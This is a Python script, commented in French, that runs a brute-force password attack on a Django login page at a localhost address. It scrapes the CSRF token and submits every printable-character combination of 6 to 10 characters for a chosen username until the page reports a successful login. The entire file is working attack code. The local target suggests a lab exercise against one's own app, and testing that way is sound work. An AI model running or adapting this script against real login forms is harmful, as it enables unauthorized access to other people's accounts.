import requests
import itertools
import string
import time
from bs4 import BeautifulSoup
# URL de ta page de connexion Django
url = 'http://127.0.0.1:8000/' 



charset = string.printable.strip()  

# Adresse username ou nom d'utilisateur que tu veux attaquer
username = 'username'  
session = requests.Session()

# Récupérer le CSRF token et le cookie
response = session.get(url)
soup = BeautifulSoup(response.content, 'html.parser')
csrf_token = soup.find('input', {'name': 'csrfmiddlewaretoken'}).get('value')
print(f"CSRF Token récupéré : {csrf_token}")


def try_password(password):
    data = {
        'username': username,
        'password': password,  # Mot de passe généré
        'csrfmiddlewaretoken': csrf_token, 
    }
    headers = {
        'X-CSRFToken': csrf_token,
    }
    response = session.post(url, data=data, headers=headers)
    if "Login successful!" in response.text:
        print(f"Connexion réussie avec : {username} / {password}")
        return True
    else:
        return False
 
def brute_force_attack(max_length=10):
    start_time = time.time()  # Commencer le chronomètr
    for length in range(6, max_length + 1):
    
        for password_tuple in itertools.product(charset, repeat=length):
            password = ''.join(password_tuple)
            print(f"Essai avec le mot de passe: {password}")

            # Tester le mot de passe
            if try_password(password):
                end_time = time.time()  # Arrêter le chronomètre
                print(f"Temps d'exécution: {end_time - start_time:.2f} secondes")
                return password  # Retourner le mot de passe trouvé et arrêter

# Lancer l'attaque par force brute
found_password = brute_force_attack()

if found_password:
    print(f"Le mot de passe correct est: {found_password}")
else:
    print("Aucun mot de passe trouvé.")
